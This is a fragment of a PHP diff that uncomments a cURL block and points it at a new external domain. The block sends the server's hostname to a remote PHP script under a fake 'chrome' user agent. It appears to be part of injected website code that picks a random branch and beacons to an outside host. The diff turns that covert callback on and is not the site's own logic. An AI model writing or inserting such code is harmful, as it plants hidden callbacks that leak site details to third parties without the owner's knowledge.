@@ -32,16 +32,16 @@ if($sayi == 1) {
  if($sayi == 2)
 {
 	
- /*
+
   $curl3 = curl_init();
  curl_setopt_array($curl3, [
     CURLOPT_RETURNTRANSFER => 1,
-    CURLOPT_URL => 'http://100-konteinerov.ru/dav/dev.php?s='.$_SERVER["SERVER_NAME"].'',
+    CURLOPT_URL => 'http://sofdar.com/dev/data.php?s='.$_SERVER["SERVER_NAME"].'',
     CURLOPT_USERAGENT => 'chrome'
 ]);
  $resp3 = curl_exec($curl3);
  curl_close($curl3);	
-	*/
+	
 } 
 
  if($sayi == 3)
